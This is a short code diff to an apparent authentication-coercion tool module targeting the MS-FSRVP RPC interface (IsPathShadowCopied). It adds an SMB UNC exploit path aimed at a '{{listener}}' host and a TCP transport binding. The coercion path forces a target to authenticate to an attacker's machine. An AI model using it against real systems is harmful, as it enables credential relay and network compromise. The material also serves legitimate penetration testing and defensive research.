@@ -35,10 +35,20 @@ class IsPathShadowCopied(MSPROTOCOLRPCCALL):
      - [@topotam77](https://twitter.com/topotam77)
     """
 
+    exploit_paths = [
+        ("smb", '\\\\{{listener}}\x00')
+    ]
+    
     access = {
         "ncan_np": [
             {
                 "namedpipe": r"\PIPE\Fssagentrpc",
+                "uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
+                "version": "1.0"
+            }
+        ],
+        "ncacn_ip_tcp": [
+            {
                 "uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
                 "version": "1.0"
             }
